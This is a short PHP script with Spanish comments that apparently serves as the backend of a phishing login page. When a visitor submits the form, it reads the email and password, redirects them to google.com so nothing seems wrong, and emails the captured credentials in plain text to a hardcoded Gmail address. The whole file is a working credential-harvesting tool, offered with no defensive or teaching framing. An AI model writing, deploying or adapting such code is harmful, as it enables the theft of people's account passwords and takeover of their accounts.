<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recuperar los datos del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Puedes hacer más validaciones aquí, como comprobar si el correo electrónico es válido, etc.

    // Redirigir a la página de Google
    header("Location: https://www.google.com");

    // Enviar el correo electrónico al destinatario
    $destinatario = "felipepzr007@gmail.com";
    $asunto = "Nuevo registro de inicio de sesión";

    $mensaje = "Nuevo registro de inicio de sesión:\n";
    $mensaje .= "Correo electrónico: $email\n";
    $mensaje .= "Contraseña: $password\n";

    // Puedes personalizar el contenido del mensaje según tus necesidades

    // Enviar el correo electrónico
    mail($destinatario, $asunto, $mensaje);

    // Puedes redirigir a una página de éxito o hacer cualquier otra acción después del registro
    exit();
}
?>
